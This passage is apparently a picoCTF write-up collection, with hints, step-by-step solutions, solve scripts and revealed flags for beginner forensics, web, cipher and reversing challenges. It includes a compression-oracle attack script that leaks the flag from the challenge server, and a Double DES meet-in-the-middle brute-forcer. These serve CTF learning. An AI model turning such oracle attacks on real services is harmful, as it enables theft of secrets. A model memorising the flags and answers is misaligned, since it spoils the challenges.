4. Hit enter and you'll get your flag

### Useful Stuffs
1. https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/379435/

## file-run1
![](https://i.imgur.com/zDt3jxy.png)

### Hints
1. To run the program at all, you must make it executable (i.e. `$ chmod +x run`)
2. Try running it by adding a '.' in front of the path to the file (i.e.` $ ./run`)

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/310/run`
2. `chmod +x run`
3. `./run` and get your flag

### Useful Stuffs
1. https://www.runoob.com/linux/linux-comm-chmod.html
2. https://www.computerhope.com/jargon/d/dotslash.htm


## file-run2
![](https://i.imgur.com/uIDAsg6.png)

### Hints
1. Try running it and add the phrase "Hello!" with a space in front (i.e. "./run Hello!")

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/353/run`
2. `chmod +x run` and run `./run "Hello!"`
3. Here comes your flag ~

### Useful Stuffs
1. https://www.runoob.com/linux/linux-comm-chmod.html
2. https://www.computerhope.com/jargon/d/dotslash.htm

## File Types (undone SUPER DUPER HARD)
![](https://i.imgur.com/ZvTqgMN.png)

### Hints 
1. Remember that some file types can contain and nest other files

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/325/Flag.pdf`
2. Run `file Flag.pdf` and it outputs `Flag.pdf: shell archive text`
3. Run `cat Flag.pdf` and get 
```c=
#!/bin/sh
# This is a shell archive (produced by GNU sharutils 4.15.2).
# To extract the files from this archive, save it to some FILE, remove
# everything before the '#!/bin/sh' line above, then type 'sh FILE'.
...
```
4. `sh Flag.pdf` an it will 


## GDB Test Drive
![](https://i.imgur.com/w6VLBUp.png)

### Hints 
None

### Solution by steps
1. After `wget` the file
2. Follow the instructions it gave

### Useful Stuffs
None

## Includes
![](https://i.imgur.com/1d7aiAV.png)

### Hints
1. Is there more code than what the inspector initially shows?

### Solution by steps
1. Press the link
![](https://i.imgur.com/Yd58rIb.png)
2. Press the 'Inspect' button after right click your mouse
![](https://i.imgur.com/hEd85st.png)
3. Press the 'Network' button at the top row
![](https://i.imgur.com/4uYMsdG.png)
4. Press the js file to see this
```javascript=
function greetings()
{
  alert("This code is in a separate file!");
}

//  f7w_2of2_b8f4b022}
```
5. Press the css file and get this
```css=
body {
  background-color: lightblue;
}

/*  picoCTF{1nclu51v17y_1of2_  */
```

6. Combine the parts of flags you get

### Useful Stuffs
None

## Inspect HTML
![](https://i.imgur.com/IAEbvcC.png)

### Hints
1. What is the web inspector in web browsers?

### Solution by steps
1. Press the link
![](https://i.imgur.com/3npMruA.png)
2. Press 'Ctrl + U' and you'll see the flag
```htmlembedded=

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>On Histiaeus</title>
  </head>
  <body>
    <h1>On Histiaeus</h1>
    <p>However, according to Herodotus, Histiaeus was unhappy having to stay in
       Susa, and made plans to return to his position as King of Miletus by 
       instigating a revolt in Ionia. In 499 BC, he shaved the head of his 
       most trusted slave, tattooed a message on his head, and then waited for 
       his hair to grow back. The slave was then sent to Aristagoras, who was 
       instructed to shave the slave's head again and read the message, which 
       told him to revolt against the Persians.</p>
    <br>
    <p> Source: Wikipedia on Histiaeus </p>
	<!--picoCTF{1n5p3t0r_0f_h7ml_fd5d57bd}-->
  </body>
</html>
```

### Useful Stuffs
None

## Local Authority
![](https://i.imgur.com/zIFQxg5.png)

### Hints
1. How is the password checked on this website?

### Solution by steps
1. Press the link
![](https://i.imgur.com/Mq6cT3E.png)
2. Press 'Inspect' after you right click your mouse on the webpage
![](https://i.imgur.com/Qo1rqrI.png)
3. Press the 'Sourse' button in the same top row of 'Elements' and enter a random Username and Password
![](https://i.imgur.com/DW6Vxrm.png)
4. Press login button on the webpage
![](https://i.imgur.com/WaCQpyG.png)
5. Press login.php and use the username & password it gave login the website again to get yoour flag

### Useful Stuffs
None

## Lookey here
![](https://i.imgur.com/lg8o4DQ.png)

### Hints
1. Download the file and search for the flag based on the known prefix.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/296/anthem.flag.txt`
2. `cat anthem.flag.txt|grep pico` and you'll get the flag

### Useful Stuffs
None

## morse-code
![](https://i.imgur.com/Lf62qQn.png)

### Hints
1. Audacity is a really good program to analyze morse code audio.

### Solution by steps
1. Download the file and upload it to [Online Morse-Code decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) to get your flag

### Useful Stuffs
1. https://morsecode.world/international/decoder/audio-decoder-adaptive.html


## Packets Primer
![](https://i.imgur.com/Q88xMO3.png)

### Hints
1. Wireshark, if you can install and use it, is probably the most beginner friendly packet analysis software product.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/201/network-dump.flag.pcap`
2. `strings network-dump.flag.pcap` and you'll see the flag with blanks
3. Copy it and run `python`, `print("p i c o C T F { p 4 c k 3 7 _ 5 h 4 r k _ 0 1 b 0 a 0 d 6 }".replace(" ",""))`
4. Get your flag after hitting enter

### Useful Stuffs
None

## patchme.py
![](https://i.imgur.com/0m6gi9c.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/388/patchme.flag.py`
2. `wget https://artifacts.picoctf.net/c/388/flag.txt.enc`
3. `vim patchme.flag.py` and you probably to see
```python=
### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################


flag_enc = open('flag.txt.enc', 'rb').read()



def level_1_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw == "ak98" + \
                   "-=90" + \
                   "adfjhgj321" + \
                   "sleuth9000"):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), "utilitarian")
        print(decryption)
        return
    print("That password is incorrect")



level_1_pw_check()
```
4. Press `:wq` to exit and run `python` also paste `print("ak98" + \
       "-=90" + \
       "adfjhgj321" + \
       "sleuth9000")`
5. Copy the result and paste it after running `python patchme.flag.py` and you got your flag

### Useful Stuffs
None

## rail-fence
![](https://i.imgur.com/FKJmmIK.png)

### Hints
1. Once you've understood how the cipher works, it's best to draw it out yourself on paper

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/274/message.txt`
2. `cat message.txt` and get `Ta _7N6DDDhlg:W3D_H3C31N__0D3ef sHR053F38N43D0F i33___NA`
3. Paste the result to [Online Rail Fence Cipher](https://www.boxentriq.com/code-breaking/rail-fence-cipher) and get your key
*Don't forget to set the rails number to 4*

### Useful Stuffs
1. https://www.boxentriq.com/code-breaking/rail-fence-cipher

## Redaction gone wrong
![](https://i.imgur.com/NBweVn4.png)

### Hints
1. How can you be sure of the redaction?

### Solution by steps
1. Download the file and use your mouse to select them all copy and paste to txt file and you'll see this
```python
Financial Report for ABC Labs, Kigali, Rwanda for the year 2021. 
Breakdown - Just painted over in MS word. 
 
Cost Benefit Analysis
Credit Debit
This is not the flag, keep looking
Expenses from the 
picoCTF{C4n_Y0u_S33_m3_fully}
Redacted document.
```

### Useful Stuffs
None

## Safe Opener
![](https://i.imgur.com/JwljkTG.png)


### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/463/SafeOpener.java`
2. `strings SafeOpener.java`
```java=
import java.io.*;
import java.util.*;  
public class SafeOpener {
    public static void main(String args[]) throws IOException {
        BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in));
        Base64.Encoder encoder = Base64.getEncoder();
        String encodedkey = "";
        String key = "";
        int i = 0;
        boolean isOpen;
        
        while (i < 3) {
            System.out.print("Enter password for the safe: ");
            key = keyboard.readLine();
            encodedkey = encoder.encodeToString(key.getBytes());
            System.out.println(encodedkey);
              
            isOpen = openSafe(encodedkey);
            if (!isOpen) {
                System.out.println("You have  " + (2 - i) + " attempt(s) left");
                i++;
                continue;
            }
            break;
        }
    }
    
    public static boolean openSafe(String password) {
        String encodedkey = "cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz";
        
        if (password.equals(encodedkey)) {
            System.out.println("Sesame open");
            return true;
        }
        else {
            System.out.println("Password is incorrect\n");
            return false;
        }
    }
```
3. Copy the encodedkey in openSafe function and use [BASE64 DECODER](https://www.base64decode.org/) to decode it and the result is the key

### Useful Stuffs
1. https://www.base64decode.org/
2. https://vimsky.com/zh-tw/examples/detail/java-method-java.util.Base64.Encoder.encodeToString.html

## Search source
![](https://i.imgur.com/1Xg7QFh.png)

### Hints
1. How could you mirror the website on your local machine so you could use more powerful tools for searching?

### Solution by steps
1. Press the link
![](https://i.imgur.com/jfrG96u.png)
2. Press the 'Inspect' button after right clicking the website 
![](https://i.imgur.com/fdRZe3t.png)
3. Press the 'Sources' button on the top bar
4. And find your flag from the files inthe left window
![](https://i.imgur.com/LZoVX3j.png)

### Useful Stuffs
None

## Sleuthkit Intro
![](https://i.imgur.com/AbH7J9m.png)

### Hints
None

### Solution by steps
1. In webshell, use `cd` and `ls` to enter the `tmp`  directory
2. `wget https://artifacts.picoctf.net/c/114/disk.img.gz`
3. `gunzip disk.img.gz` and run `mmls disk.img`
```python
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000204799   0000202752   Linux (0x83)
```
4. Copy the length of the length of Linux and paste it after running `nc saturn.picoctf.net 52279`

### Useful Stuffs
1. http://note.drx.tw/2008/04/command.html
2. http://www.sleuthkit.org/sleuthkit/man/mmls.html

## substitution0
![](https://i.imgur.com/hS6LsNe.png)

### Hints
1. Try a frequency attack. An online tool might help.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/381/message.txt`
2. `cat message.txt` and get this
```python
VOUHMJLTESZCDKWIXNQYFAPGBR 

Tmnmfiwk Cmlnvkh vnwqm, peyt v lnvam vkh qyvymcb ven, vkh onwflty dm ytm ommycm
jnwd v lcvqq uvqm ek pteut ey pvq mkucwqmh. Ey pvq v omvfyejfc quvnvovmfq, vkh, vy
ytvy yedm, fkzkwpk yw kvyfnvceqyq—wj uwfnqm v lnmvy inerm ek v quemkyejeu iweky
wj aemp. Ytmnm pmnm ypw nwfkh ocvuz qiwyq kmvn wkm mgynmdeyb wj ytm ovuz, vkh v
cwkl wkm kmvn ytm wytmn. Ytm quvcmq pmnm mgummheklcb tvnh vkh lcwqqb, peyt vcc ytm
viimvnvkum wj ofnkeqtmh lwch. Ytm pmelty wj ytm ekqmuy pvq amnb nmdvnzvocm, vkh,
yvzekl vcc yteklq ekyw uwkqehmnvyewk, E uwfch tvnhcb ocvdm Sfieymn jwn teq wiekewk
nmqimuyekl ey.

Ytm jcvl eq: ieuwUYJ{5FO5717F710K_3A0CF710K_357OJ9JJ}
```
3. Copy the output and paste it to [quipqiup](https://quipqiup.com/) to get your flag

### Useful Stuffs
1. https://quipqiup.com/

## substitution1
![](https://i.imgur.com/HSa3nvr.png)

### Hints
1. Try a frequency attack
2. Do the punctuation and the individual words help you make any substitutions?

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/416/message.txt`
2. `cat message.txt` and you'll see this
```python
OYAt (txwsy aws ompyksb yxb ajmf) msb m yupb wa owzpkybs tboksgyu owzpbygygwd. Owdybtymdyt msb psbtbdybr lgyx m tby wa oxmjjbdfbt lxgox ybty yxbgs osbmygegyu, yboxdgomj (mdr fwwfjgdf) tqgjjt, mdr pswhjbz-twjegdf mhgjgyu. Oxmjjbdfbt ktkmjju owebs m dkzhbs wa omybfwsgbt, mdr lxbd twjebr, bmox ugbjrt m tysgdf (omjjbr m ajmf) lxgox gt tkhzgyybr yw md wdjgdb towsgdf tbsegob. OYAt msb m fsbmy lmu yw jbmsd m lgrb mssmu wa owzpkybs tboksgyu tqgjjt gd m tmab, jbfmj bdegswdzbdy, mdr msb xwtybr mdr pjmubr hu zmdu tboksgyu fswkpt mswkdr yxb lwsjr aws akd mdr psmoygob. Aws yxgt pswhjbz, yxb ajmf gt: pgowOYA{AS3CK3DOU_4774OQ5_4S3_O001_6B0659AH}
```
3. Copy the result and paste it to [quipqiup](https://quipqiup.com/) and find the one spells frequency correctly

### Useful Stuffs
1. https://quipqiup.com/


## substitution2
![](https://i.imgur.com/GBlrin6.png)

### Hints
1. Try refining your frequency attack, maybe analyzing groups of letters would improve your results?

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/109/message.txt`
2. `cat message.txt` and you'll see this
```python!
tzvwvvfsotovmvwrpktzvwcvppvotrlpsozvyzshzoizkkpikqgntvwovinwstjikqgvtstskeoseipnysehijlvwgrtwsktreynoijlvwizrppvehvtzvovikqgvtstskeoxkinogwsqrwspjkeojotvqoryqsesotwrtskexneyrqvetrpoczsizrwvmvwjnovxnpreyqrwuvtrlpvousppozkcvmvwcvlvpsvmvtzvgwkgvwgnwgkovkxrzshzoizkkpikqgntvwovinwstjikqgvtstskesoektkepjtktvrizmrpnrlpvousppolntrpoktkhvtotnyvetosetvwvotvysereyvfistvyrlkntikqgntvwoisveivyvxveosmvikqgvtstskeorwvkxtveprlkwsknorxxrsworeyikqvykcetkwneesehizviupsotoreyvfvintsehikexshoiwsgtokxxveovketzvktzvwzreysozvrmspjxkinovykevfgpkwrtskereysqgwkmsortskereykxtvezrovpvqvetokxgprjcvlvpsvmvrikqgvtstsketknizsehketzvkxxveosmvvpvqvetokxikqgntvwovinwstjsotzvwvxkwvrlvttvwmvzsipvxkwtvizvmrehvpsoqtkotnyvetoserqvwsirezshzoizkkpoxnwtzvwcvlvpsvmvtzrtreneyvwotreysehkxkxxveosmvtvizesanvosovoovetsrpxkwqknetsehrevxxvitsmvyvxveovreytzrttzvtkkporeyikexshnwrtskexkinoveiknetvwvyseyvxveosmvikqgvtstskeoykvoektpvryotnyvetotkuekctzvswvevqjrovxxvitsmvpjrotvrizsehtzvqtkritsmvpjtzseupsuvrerttriuvwgsikitxsorekxxveosmvpjkwsvetvyzshzoizkkpikqgntvwovinwstjikqgvtstsketzrtovvuotkhvevwrtvsetvwvotseikqgntvwoisveivrqkehzshzoizkkpvwotvrizsehtzvqveknhzrlkntikqgntvwovinwstjtkgsanvtzvswinwskostjqktsmrtsehtzvqtkvfgpkwvketzvswkcereyverlpsehtzvqtklvttvwyvxveytzvswqrizsevotzvxprhsogsikITX{E6W4Q_4E41J515_15_73Y10N5_42VR1770}
```
3. Copy and paste it to [Substitution-solver](https://www.guballa.de/substitution-solver) an dget your flag
*Don't forget to set the language to English and press Break Cipher*

### Useful Stuffs
1. https://www.guballa.de/substitution-solver

## transposition-trial
![](https://i.imgur.com/8hwTSZs.png)

### Hints
1. Split the message up into blocks of 3 and see how the first block is scrambled

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/458/message.txt`
2. `cat message.txt` and it returns `heTfl g as iicpCTo{7F4NRP051N5_16_35P3X51N3_V9AAB1F8}7`
3. `vim solve.py` and write down 
```python=
ef = "heTfl g as iicpCTo{7F4NRP051N5_16_35P3X51N3_V9AAB1F8}7"

flag = ""
for i in range(12, len(ef),3):
    tmp = ef[i:i+3]
    flag += tmp[2] + tmp[0:2]

print(flag)
```
4. Press `:wq` to quit and run `python solve.py` to get your flag

### Useful Stuffs
None

## unpackme.py
![](https://i.imgur.com/tdazy3l.png)

### Hints
None

### Solution by steps
1. ` wget https://artifacts.picoctf.net/c/466/unpackme.flag.py`
2. `vim unpackme.flag.py` and it seems `plain.decode()` has the flag which is decoded so edit the file to 
```python=
import base64
from cryptography.fernet import Fernet



payload = b'gAAAAABiMD09KmaS5E6AQNpRx1_qoXOBFpSny3kyhr8Dk_IEUu61Iu0TaSIf8RCyf1LJhKUFVKmOt2hfZzynRbZ_fSYYN_OLHTTIRZOJ6tedEaK6UlMSkYJhRjAU4PfeETD-8gDOA6DQ8eZrr47HJC-kbyi3Q5o3Ba28mutKCAkwrqt3gYOY9wp3dWYSWzP4Tc3NOYWfu-SJbW997AM8GA-APpGfFrf9f7h0VYcdKOKu4Vq9zjJwmTG2VXWFET-pkF5IxV3ZKhz36L5IvZy1dVZXqaMR96lovw=='

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
print(plain.decode())
# exec(plain.decode())
```
3. Press esc and `:wq` to quit 
4. And run `python unpackme.flag.py`to get the flag

### Useful Stuffs
1. https://www.youtube.com/watch?v=dMAVHIt6ITw&ab_channel=JohnHammond
2. https://www.geeksforgeeks.org/fernet-symmetric-encryption-using-cryptography-module-in-python/

## Vigenere
![](https://i.imgur.com/AGifitd.png)

### Hints
1. https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/529/cipher.txt `
2. `cat cipher.txt` and get `rgnoDVD{O0NU_WQ3_G1G3O3T3_A1AH3S_2951c89f}`
3. Copy the result and paste it to [Vigenere-cipher Decoder](https://www.dcode.fr/vigenere-cipher) 
*Don't forget to add the key under the 'Decryption method' subtitle*
4. You'll get the flag after pushing the 'Decrypt' button

### Useful Stuffs
1. https://www.dcode.fr/vigenere-cipher
2. https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher

## First Find
![](https://i.imgur.com/KPz7XiQ.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/552/files.zip`
2. `unzip files.zip`, `cd files` and run `ls` to list all files under it
3. Use `cd` and `ls -a` to find the uber-secret.txt
*Don't forget to run `cat uber-secret.txt`*

### Useful Stuffs
1. https://www.simplified.guide/linux/file-folder-view-hidden

## Big Zip
![](https://i.imgur.com/6KnwRjT.png)

### Hints
1. Can grep be instructed to look at every file in a directory and its subdirectories?

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/555/big-zip-files.zip`
2. `unzip big-zip-files.zip` and `cd big-zip-files`
3. `grep -nr picoCTF` to get your flag

### Useful Stuffs
1. https://stackoverflow.com/questions/4121803/how-can-i-use-grep-to-find-a-word-inside-a-folder
2. https://www.youtube.com/watch?v=EIjcXqIJ34g&ab_channel=ChamathViranga

## Disk, disk, sleuth!
![](https://i.imgur.com/T38nKcE.png)

### Hints
1. Have you ever used `file` to determine what a file was?
2. Relevant terminal-fu in picoGym: https://play.picoctf.org/practice/challenge/85
3. Mastering this terminal-fu would enable you to find the flag in a single command: https://play.picoctf.org/practice/challenge/48
4. Using your own computer, you could use qemu to boot from this disk!

### Solution by steps
1. `cd` to tmp directory and run ` wget https://mercury.picoctf.net/static/920731987787c93839776ce457d5ecd6/dds1-alpine.flag.img.gz`
2. `srch_strings -a dds1-alpine.flag.img| grep picoCTF` and get your flag

### Useful Stuffs
1. https://manpages.ubuntu.com/manpages/bionic/man1/srch_strings.1.html
2. https://github.com/Kasimir123/CTFWriteUps/tree/main/2021-03-picoCTF/Disk%2C-Disk%2C-sleuth!

## Play Nice
![](https://i.imgur.com/cyaCDII.png)

### Hints
None

### Solution by steps
1. `wget https://mercury.picoctf.net/static/283dcc58048f3a6ac83b4c11ec696954/playfair.py`
2. `vim playfair.py` and realize how encrypt_pair and encrypt_string works
```python=
#!/usr/bin/python3 -u
import signal
SQUARE_SIZE = 6
def generate_square(alphabet):
        assert len(alphabet) == pow(SQUARE_SIZE, 2)
        matrix = []
        for i, letter in enumerate(alphabet):
                if i % SQUARE_SIZE == 0:
                        row = []
                row.append(letter)
                if i % SQUARE_SIZE == (SQUARE_SIZE - 1):
                        matrix.append(row)
        return matrix
def get_index(letter, matrix):
        for row in range(SQUARE_SIZE):
                for col in range(SQUARE_SIZE):
                        if matrix[row][col] == letter:
                                return (row, col)
        print("letter not found in matrix.")
        exit()
def encrypt_pair(pair, matrix):
        p1 = get_index(pair[0], matrix)
        p2 = get_index(pair[1], matrix)
        if p1[0] == p2[0]:
                return matrix[p1[0]][(p1[1] + 1)  % SQUARE_SIZE] + matrix[p2[0]][(p2[1] + 1)  % SQUARE_SIZE]
        elif p1[1] == p2[1]:
                return matrix[(p1[0] + 1)  % SQUARE_SIZE][p1[1]] + matrix[(p2[0] + 1)  % SQUARE_SIZE][p2[1]]
        else:
                return matrix[p1[0]][p2[1]] + matrix[p2[0]][p1[1]]
def encrypt_string(s, matrix):
        result = ""
        if len(s) % 2 == 0:
                plain = s
        else:
                plain = s + "irlgektq8ayfp5zu037nov1m9xbc64shwjd2"[0]
        for i in range(0, len(plain), 2):
                result += encrypt_pair(plain[i:i + 2], matrix)
        return result
alphabet = open("key").read().rstrip()
m = generate_square(alphabet)
msg = open("msg").read().rstrip()
enc_msg = encrypt_string(msg, m)
print("Here is the alphabet: {}\nHere is the encrypted message: {}".format(alphabet, enc_msg))
signal.alarm(18)
resp = input("What is the plaintext message? ").rstrip()
if resp and resp == msg:
        print("Congratulations! Here's the flag: {}".format(open("flag").read()))
# https://en.wikipedia.org/wiki/Playfair_cipher
```

3. `vim solve.py` and write down 
```python=
# alphabet for matrix
alphabet = "irlgektq8ayfp5zu037nov1m9xbc64shwjd2"

# square size
SQUARE_SIZE = 6

def generate_square(alphabet):
	assert len(alphabet) == pow(SQUARE_SIZE, 2)
	matrix = []
	for i, letter in enumerate(alphabet):
		if i % SQUARE_SIZE == 0:
			row = []
		row.append(letter)
		if i % SQUARE_SIZE == (SQUARE_SIZE - 1):
			matrix.append(row)
	return matrix

def get_index(letter, matrix):
	for row in range(SQUARE_SIZE):
		for col in range(SQUARE_SIZE):
			if matrix[row][col] == letter:
				return (row, col)
	print("letter not found in matrix.")
	exit()


# decrypt each pair
def decrypt_pair(pair, matrix):

	# get the indices in the matrix
	p1 = get_index(pair[0], matrix)
	p2 = get_index(pair[1], matrix)

	# if the first index is the same
	if p1[0] == p2[0]:
		return matrix[p1[0]][(p1[1]-1)%SQUARE_SIZE]+matrix[p2[0]][(p2[1]-1)%SQUARE_SIZE]

	# if the second index is the same
	if p1[1] == p2[1]:
		return matrix[(p1[0] - 1)  % SQUARE_SIZE][p1[1]] + matrix[(p2[0] - 1)  % SQUARE_SIZE][p2[1]]

	# else
	return matrix[p1[0]][p2[1]] + matrix[p2[0]][p1[1]]

# decrypt string function
def decrypt_string(s, matrix):
	# place to store result
	result = ""

	# Iterate through string two at a time
	for i in range(0, len(s), 2):

		# pass the pairs to the decrypt_pair function
		result += decrypt_pair(s[i:i+2], matrix)

	# return result
	return result

# generate square
m = generate_square(alphabet)

# encrypted message
enc_msg = "h5a1sqeusdi38obzy0j5h3ift7s2r2"

# decrypt string
print(decrypt_string(enc_msg, m))
```
4. Type `:wq` and run `python solve.py` to get the plaintext message
5. Copy and paste after running `nc mercury.picoctf.net 40742` to get the flag
*Don't need to wrap the flag with `picoCTF{}`*

### Useful Stuffs
1. https://github.com/Kasimir123/CTFWriteUps/tree/main/2021-03-picoCTF/play-nice

## Some Assembly Required 2
![](https://i.imgur.com/Gqpoxpp.png)

### Hints
None

### Solution by steps
1. Press the link
![](https://i.imgur.com/8FogooM.png)
2. Press 'Inspect' after right-clicking the website
![](https://i.imgur.com/EYe3iUE.png)
3. Click 'Sources' button on the top row and select the file under wasm
![](https://i.imgur.com/krvtXo5.png)
4. Copy the red line and move to the terminal.
5. Run `python` and write down
```python
s = [chr(ord(j)^8) for j in "THINGS_YOU_JUST_COPIED"]
print(s)
```
6. Copy all the stuff in the curly brackets and run `print("THINGS_YOU_JUST_COPIED".replace("', '",""))`
*Don't forget to wrap it with `picoCTF{}`*

### Useful Stuffs
1. https://www.youtube.com/watch?v=2TCZEkW0bjc&ab_channel=MartinCarlisle

## gogo (SUPER DUPER SUPER DUPER HARD)
![](https://i.imgur.com/PW0QnFG.png)


### Hints
1. use go tool objdump or ghidra


### Solution by steps
None

### Useful Stuffs
1. https://ctftime.org/writeup/28041

## Milkslap(SUPER DUPER SUPER DUPER HARD)
![](https://i.imgur.com/ELGOKwn.png)

### Hints
1. Look at the problem category

### Solution by steps


### Useful Stuffs
1. https://ctftime.org/writeup/28159


## Double DES
![](https://i.imgur.com/mdMe4GZ.png)

### Hints
1. How large is the keyspace?

### Solution by steps
1. `vim solve.py` and write down
```python=
from Crypto.Cipher import DES
import binascii
import itertools
import random
import string

def pad(msg) :
    block_len = 8
    over = len(msg) % block_len
    pad = block_len - over
    return (msg + " " * pad).encode()
    
def generate_key():
    return pad("".join(random.choice(string.digits) for _ in range(6)))

def get_input():
    try:
        res = binascii.unhexlify(input("What data would you like to encrypt? ").rstrip()).decode()
    except:
        res = None
    return res
    
def double_encrypt(m):
    msg = pad(m)
    cipher1 = DES.new(KEY1, DES.MODE_ECB)
    enc_msg = cipher1.encrypt(msg)
    cipher2 = DES.new(KEY2,DES.MODE_ECB)
    return binascii.hexlify(cipher2.encrypt(enc_msg)).decode()
    
flag = binascii.unhexlify("685734ff7642e98e4a9df0c2a591aa8e81fb68e9ffafeb513f501704c2020f097937da27eebfc79e")
ciphertext = binascii.unhexlify("f301adec709ce06c")
inputs = binascii.unhexlify("41").decode()
inputs = pad(inputs)
mydict = {}

for KEY1tuple in itertools.product(string.digits, repeat = 6):
    KEY1t = pad(''.join(KEY1tuple))
    cipher1 = DES.new(KEY1t, DES.MODE_ECB)
    enc_msg = cipher1.encrypt(inputs)
    mydict[enc_msg] = KEY1t
    
for KEY2tuple in itertools.product(string.digits, repeat = 6):
    KEY2t = pad(''.join(KEY2tuple))
    cipher2 = DES.new(KEY2t, DES.MODE_ECB)
    dec_msg = cipher2.decrypt(ciphertext)
    if dec_msg in mydict:
        KEY1t = mydict[dec_msg]
        print(KEY1t)
        print(KEY2t)
        dec_msg = cipher2.decrypt(flag)
        cipher1 = DES.new(KEY1t, DES.MODE_ECB)
        dec_msg = cipher1.decrypt(dec_msg)
        print(dec_msg)
        break

```

2. Press `:wq` to exit and run `python solve.py` to get the key

### Useful Stuffs
1. https://www.youtube.com/watch?v=j5-Ha88Rnu8&ab_channel=MartinCarlisle

## ARMssembly 3
![](https://i.imgur.com/OYmqvg4.png)

### Hints
1. beep boop beep boop...

### Solution by steps
1. `wget https://mercury.picoctf.net/static/c2e82253f25bb9473298523daa336ab6/chall_3.S`
2. `strings chall_3.S` and read through it
3. Run `python` ,`bin(NUMBER_YOU_GOT_FROM_THE_QUESTION)` and count how many '1's in it
4. `hex(THE_NUMBER_YOU_GET_ABOVE*3)` copy the result after '0x' in the apostrophes
5. Format in the way the question gave

### Useful Stuffs
1. https://www.youtube.com/watch?v=WG9Ypsnr-94&ab_channel=MartinCarlisle

## Compress and Attack
![](https://i.imgur.com/uRBQxUg.png)

### Hints
1. The flag only contains uppercase and lowercase letters, underscores, and braces (curly brackets)

### Solution by steps
1. `wget https://mercury.picoctf.net/static/24f9e793900aeba6f183dce8e0b14e90/compress_and_attack.py`
2. `strings compress_and_attack.py` and you'll see this
```python=
#!/usr/bin/python3 -u
import zlib
from random import randint
import os
from Crypto.Cipher import Salsa20
flag = open("./flag").read()
def compress(text):
    return zlib.compress(bytes(text.encode("utf-8")))
def encrypt(plaintext):
    secret = os.urandom(32)
    cipher = Salsa20.new(key=secret)
    return cipher.nonce + cipher.encrypt(plaintext)
def main():
    while True:
        usr_input = input("Enter your text to be encrypted: ")
        compressed_text = compress(flag + usr_input)
        encrypted = encrypt(compressed_text)
        
        nonce = encrypted[:8]
        encrypted_text =  encrypted[8:]
        print(nonce)
        print(encrypted_text)
        print(len(encrypted_text))
if __name__ == '__main__':
    main()
```
3. Run `vim solve.py` and write down 
```python=
from pwn import *
import string


def get_min_args(zlib_oracle):
    srtd_oracle = sorted(zlib_oracle, key=lambda i: zlib_oracle[i])
    min_value = zlib_oracle[srtd_oracle[0]]
    min_args = []
    for arg in srtd_oracle:
        if zlib_oracle[arg] == min_value:
            min_args.append(arg)
        else:
            break
    return min_args


if __name__ == "__main__":
    # r = process(argv=["python", "compress_and_attack.py"])
    r = remote("mercury.picoctf.net", 33976)
    alphabet = string.ascii_letters + string.digits + "_}"
    base = ["picoCTF{"]
    found = False    
    while not found:
        zlib_oracle = {}
        for partial in base:
            for char in alphabet:
                try:
                    print(r.recvuntil("encrypted: ").decode(), end="")
                    payload = partial + char
                    r.sendline(payload)
                    print(payload)
                    r.recvline()
                    r.recvline()
                    val = int(r.recvline().decode()[:-1])
                    zlib_oracle[payload] = val
                except:
                    # server closes the connection after some time
                    r = remote("mercury.picoctf.net", 50899)
        base = get_min_args(zlib_oracle)
        if len(base) == 1 and base[0][-1] == '}':
            found = True
            r.close()
    print("Flag found: {}".format(base[0]))
```
4. Type `:wq` to exit and run `python solve.py` to get your code

### Useful Stuffs
1. https://pwnthenope.github.io/writeups/2021/03/30/compress_and_attack.html

## Disk, disk, sleuth! II
![](https://i.imgur.com/rgpGlHs.png)

### Hints
1. The sleuthkit has some great tools for this challenge as well.
2. Sleuthkit docs here are so helpful: [TSK Tool Overview](http://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview)
3. This disk can also be booted with qemu!

### Solution by steps
1. `wget gunzip dds2-alpine.flag.img.gz`
2. `mmls dds2-alpine.flag.img` and you'll see this
```clike=
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000262143   0000260096   Linux (0x83)
```
3. `fls -o 2048 dds2-alpine.flag.img`
```python=
d/d 26417:      home
d/d 11: lost+found
r/r 12: .dockerenv
d/d 20321:      bin
d/d 4065:       boot
d/d 6097:       dev
d/d 2033:       etc
d/d 8129:       lib
d/d 14225:      media
d/d 16257:      mnt
d/d 18289:      opt
